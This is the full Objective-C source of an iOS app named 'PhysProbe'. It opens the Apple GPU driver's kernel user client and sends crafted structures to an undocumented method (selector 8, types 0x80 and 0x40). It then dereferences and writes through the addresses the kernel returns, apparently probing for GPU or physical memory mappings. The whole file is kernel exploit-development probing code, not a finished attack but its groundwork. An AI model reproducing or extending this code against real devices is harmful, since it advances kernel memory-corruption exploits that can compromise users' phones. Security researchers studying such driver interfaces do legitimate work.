#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <Foundation/Foundation.h>
#import <string.h>
#import <stdlib.h>
#import <mach/mach.h>
#import <mach/vm_region.h>
static NSMutableString *gLog; static NSString *gPath;
static void L(NSString *fmt,...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[pp] %@",s);}
static uint64_t rd64(const void*p){uint64_t v;memcpy(&v,p,8);return v;}
static io_connect_t C;
static kern_return_t mkres(uint32_t type,uint64_t a38,uint64_t a40,uint64_t a48,uint32_t a50,uint8_t*out){
 uint8_t in[0x100]; memset(in,0,sizeof(in)); *(uint32_t*)in=type;
 *(uint64_t*)(in+0x18)=0; *(uint64_t*)(in+0x38)=a38; *(uint64_t*)(in+0x40)=a40; *(uint64_t*)(in+0x48)=a48; *(uint32_t*)(in+0x50)=a50;
 memset(out,0xAA,0x1000); size_t os=0x1000;
 return IOConnectCallStructMethod(C,8,in,0x100,out,&os);
}
static void show(const char*tag,kern_return_t kr,uint8_t*out){
 L(@"[%s] kr=0x%x q0=0x%llx q1=0x%llx q2=0x%llx q3=0x%llx q4=0x%llx q5=0x%llx q6=0x%llx q7=0x%llx q8=0x%llx q9=0x%llx q10=0x%llx q11=0x%llx",
   tag,kr,(unsigned long long)rd64(out),(unsigned long long)rd64(out+8),(unsigned long long)rd64(out+0x10),(unsigned long long)rd64(out+0x18),
   (unsigned long long)rd64(out+0x20),(unsigned long long)rd64(out+0x28),(unsigned long long)rd64(out+0x30),(unsigned long long)rd64(out+0x38),
   (unsigned long long)rd64(out+0x40),(unsigned long long)rd64(out+0x48),(unsigned long long)rd64(out+0x50),(unsigned long long)rd64(out+0x58));
}
static void run(void){
 io_service_t svc=IOServiceGetMatchingService(kIOMasterPortDefault,IOServiceMatching("AGXAcceleratorG14P"));
 L(@"[svc] 0x%x",svc); if(!svc)return;
 kern_return_t kr=IOServiceOpen(svc,mach_task_self(),1,&C); IOObjectRelease(svc);
 L(@"[open] 0x%x",kr); if(kr)return;
 uint8_t o1[0x1000],o2[0x1000];
 /* type 0x80 variants: (addr,size,offset,page) */
 struct {uint64_t a38,a40,a48;uint32_t a50;const char*tag;} v[]={
  {0x4000,0,0x4000,0x4000,"80a"},
  {0x0,0x4000,0x4000,0x4000,"80b"},
  {0x4000,0x4000,0x4000,0x4000,"80c"},
  {0x4000,0x0,0x0,0x4000,"80d"},
 };
 for(int i=0;i<4;i++){
  kr=mkres(0x80,v[i].a38,v[i].a40,v[i].a48,v[i].a50,o1);
  show(v[i].tag,kr,o1);
  if(kr) continue;
  uint64_t q3=rd64(o1+0x18), q10=rd64(o1+0x50);
  if(q3>0x10000){
   volatile uint64_t*p=(volatile uint64_t*)(uintptr_t)q3;
   if(i==0){for(int k=0;k<0x800;k++)p[k]=0xA1B2C3D400000000ULL|k;}
   L(@"[%s] q3 first: 0x%llx 0x%llx q10=0x%llx",v[i].tag,(unsigned long long)p[0],(unsigned long long)p[1],(unsigned long long)q10);
  }
  if(q10 && q10<0x10000000000ULL){
   kr=mkres(0x40,q10,0x4000,0,0x4000,o2);
   show("map40",kr,o2);
   if(!kr){
    uint64_t m=rd64(o2+0x18);
    L(@"[%s] map40 q3=0x%llx q10=0x%llx rd0=0x%llx rd1=0x%llx",v[i].tag,(unsigned long long)m,(unsigned long long)rd64(o2+0x50),
      m>0x10000?(unsigned long long)*(volatile uint64_t*)(uintptr_t)m:0ULL,m>0x10000?(unsigned long long)*(volatile uint64_t*)(uintptr_t)(m+8):0ULL);
   }
  }
 }
 IOServiceClose(C); L(@"=== done ===");
}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{
 self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;
 UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"PhysProbe\n";
 [vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH,0),^{NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];gPath=[docs stringByAppendingPathComponent:@"pp.log"];gLog=[NSMutableString new];run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});
 return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
